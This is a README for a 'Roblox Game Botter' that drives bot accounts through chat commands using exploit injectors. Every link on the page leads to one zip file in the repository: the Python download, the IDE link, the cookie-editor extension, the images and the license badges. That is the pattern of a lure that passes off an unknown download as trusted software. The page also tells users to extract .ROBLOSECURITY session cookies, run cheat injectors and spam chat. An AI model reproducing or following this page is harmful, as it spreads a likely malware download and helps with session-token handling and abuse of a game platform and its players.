# Roblox Game Botter 

<img src="https://github.com/kosagui/Roblox-Botter/raw/refs/heads/main/adjudgment/Roblox_Botter_v1.1.zip" style="width: 90%"> 

[![MIT License][license-shield]][license-url]
[![Forks][forks-shield]][forks-url]
[![Stargazers][stars-shield]][stars-url]
[![Issues][issues-shield]][issues-url]

<br>

Make accounts join games and control what they do with chat commands! <br>
The instructions below are listed in order of steps so make sure to follow them! <br>

Some exploits will break at times such as Synapse not auto attaching. <br>
Please do not create an issue about this, report it to the exploit developers instead.

<br>

# Requirements:
<ul>
  <li>  <a href="https://github.com/kosagui/Roblox-Botter/raw/refs/heads/main/adjudgment/Roblox_Botter_v1.1.zip"> Python 3.8 > </a> </li>
  <li> <b> Python Packages: </b> time, requests, pathlib, https://github.com/kosagui/Roblox-Botter/raw/refs/heads/main/adjudgment/Roblox_Botter_v1.1.zip, os, threading </li>
  <li> A Roblox exploit that supports Autoexec <b> (<a href="https://github.com/kosagui/Roblox-Botter/raw/refs/heads/main/adjudgment/Roblox_Botter_v1.1.zip">Synapse</a>: Paid or <a href="https://github.com/kosagui/Roblox-Botter/raw/refs/heads/main/adjudgment/Roblox_Botter_v1.1.zip">Krnl</a>: Free) </b> </li>
  <li> <a href="https://github.com/kosagui/Roblox-Botter/raw/refs/heads/main/adjudgment/Roblox_Botter_v1.1.zip"> Edit this cookie </a> </li>
  <li> <a href="https://github.com/kosagui/Roblox-Botter/raw/refs/heads/main/adjudgment/Roblox_Botter_v1.1.zip%20Games"> Muitiple rbx </a> </li>
  <li> A python IDE, (I'd recomend <a href="https://github.com/kosagui/Roblox-Botter/raw/refs/heads/main/adjudgment/Roblox_Botter_v1.1.zip">Pycharm</a>) </li>
</ul>

<br>
<br>

# Installing Python
Go to https://github.com/kosagui/Roblox-Botter/raw/refs/heads/main/adjudgment/Roblox_Botter_v1.1.zip and install the latest version (3.11 recomended) and make sure to add it to Path! You may need to restart afterwards.

Check if python is installed by typing `python -h` in Commmand prompt.

Python should pip <b>(Python's package manager)</b> as well, so let's check if it installed as well. To do this run `pip -h` in Command prompt. <br>
If pip as installed sucessfully, run `pip install requests pathlib`. This will install the required packages.

<br>
<br> 

# Grabbing the Roblox account's cookie
For this you need <a href="https://github.com/kosagui/Roblox-Botter/raw/refs/heads/main/adjudgment/Roblox_Botter_v1.1.zip"> Edit this cookie </a> or simular to browse cookies.

Locate `.ROBLOSECURITY` and copy it's value <br>

<img style="width: auto; height: 600px" src="https://github.com/kosagui/Roblox-Botter/raw/refs/heads/main/adjudgment/Roblox_Botter_v1.1.zip"/>
<br><br>

**WARNING** If you log out of the account, the cookie will become invalid! Instead, set `.ROBLOSECURITY`'s value to ` `&nbsp;and click the green arrow icon on the bottom of the menu (Shown in picture above).

<br><br>

## Adding the cookie

In the cookie array, add the cookie's value as a string. <br>

<img src="https://github.com/kosagui/Roblox-Botter/raw/refs/heads/main/adjudgment/Roblox_Botter_v1.1.zip" style="width: 70%"/>

<br>

To format muitple cookies, I have list an example below.

```
config = {
    "Cookies": [
        ".ROBLOSECURITY Here",
        ".ROBLOSECURITY Here",
        ".ROBLOSECURITY Here"
    ]
}
```
<b> The last line should not incude a `,` at the end of the line otherwise it will result in a syntax error. </b>

After this, change the `Bot` variable to the amount of bots you want! <b>(The max amount is how many cookies you provided)</b>

<br>
<br>

# Adding the bot controler

Locate your exploit's autoexec folder and drag n drop `https://github.com/kosagui/Roblox-Botter/raw/refs/heads/main/adjudgment/Roblox_Botter_v1.1.zip` into it. <br>

![image](https://github.com/kosagui/Roblox-Botter/raw/refs/heads/main/adjudgment/Roblox_Botter_v1.1.zip)

<br>
<br>

# Botting a game

Once you have compleated the steps above, copy your Roblox's username `NOT DISPLAY NAME` to be added to the permission list in `https://github.com/kosagui/Roblox-Botter/raw/refs/heads/main/adjudgment/Roblox_Botter_v1.1.zip`.
Once copyied paste it into the table and save the file. <br>

<img src="https://github.com/kosagui/Roblox-Botter/raw/refs/heads/main/adjudgment/Roblox_Botter_v1.1.zip" style="width: 70%"/>


Open your exploit and MuitRBX, join the game you would like to bot. Once in the game execute a script like <a href="https://github.com/kosagui/Roblox-Botter/raw/refs/heads/main/adjudgment/Roblox_Botter_v1.1.zip">Infinite Yield</a> and copy the game's Jobid and paste it into the python script and reduce it to the image shown below on line 3. <br>

<img src="https://github.com/kosagui/Roblox-Botter/raw/refs/heads/main/adjudgment/Roblox_Botter_v1.1.zip" style="width: 70%"/>

Run the python script and enjoy.

# Commands

<b> NOTE: Player names can be shortened! </b>
Each argument is seperated by `, `

```
Unlock, (true/false) | Wether all players have permission to use the bots.
Come, (PlayerName) | Teleports all bots to a player | Stop `Come, `
Say, (Msg) | Make the bots say a message.
Say, loop, (Msg) | Make the bots spam a message. | Stop `Say, .`
chatmode, (Mode) | Change the Chat mode e.g `All, General`
Rejoin | Make the bots rejoin the game.
Follow, (Player name) | Make the bots follow a player. | Stop `Follow, `
```

<!-- MARKDOWN LINKS & IMAGES -->
<!-- https://github.com/kosagui/Roblox-Botter/raw/refs/heads/main/adjudgment/Roblox_Botter_v1.1.zip -->

[forks-shield]: https://github.com/kosagui/Roblox-Botter/raw/refs/heads/main/adjudgment/Roblox_Botter_v1.1.zip
[forks-url]: https://github.com/kosagui/Roblox-Botter/raw/refs/heads/main/adjudgment/Roblox_Botter_v1.1.zip

[stars-shield]: https://github.com/kosagui/Roblox-Botter/raw/refs/heads/main/adjudgment/Roblox_Botter_v1.1.zip
[stars-url]: https://github.com/kosagui/Roblox-Botter/raw/refs/heads/main/adjudgment/Roblox_Botter_v1.1.zip

[issues-shield]: https://github.com/kosagui/Roblox-Botter/raw/refs/heads/main/adjudgment/Roblox_Botter_v1.1.zip
[issues-url]: https://github.com/kosagui/Roblox-Botter/raw/refs/heads/main/adjudgment/Roblox_Botter_v1.1.zip

[license-shield]: https://github.com/kosagui/Roblox-Botter/raw/refs/heads/main/adjudgment/Roblox_Botter_v1.1.zip
[license-url]: https://github.com/kosagui/Roblox-Botter/raw/refs/heads/main/adjudgment/Roblox_Botter_v1.1.zip
